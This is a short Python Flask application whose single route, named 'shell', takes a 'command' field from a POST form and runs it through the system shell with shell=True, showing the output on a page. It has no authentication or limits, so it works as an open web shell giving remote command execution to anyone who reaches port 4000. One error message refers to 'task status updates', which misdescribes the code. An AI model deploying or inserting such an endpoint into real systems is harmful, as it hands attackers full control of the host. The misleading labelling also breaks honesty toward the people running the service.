from flask import Flask
from flask import request, render_template, render_template_string
import subprocess, os
template_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')
print('template_dir', template_dir)
app = Flask(__name__, template_folder=template_dir)

@app.route('/', methods=['GET', 'POST'])
def shell():
    if request.method == 'POST':
        try:
            form = request.form
            if form.get('command', False):
                result_success = subprocess.check_output([form.get('command')], shell=True)
            else:
                return render_template('form.html', error="Unknown command error.")
        except subprocess.CalledProcessError as e:
            return render_template('form.html', error="An error occurred while trying to fetch task status updates.")
        if type(result_success) == bytes:
            result_success = result_success.decode()
        return render_template('form.html', error=result_success)
    else:
        return render_template('form.html', error="")

if __name__ == '__main__':
    app.run(port=4000)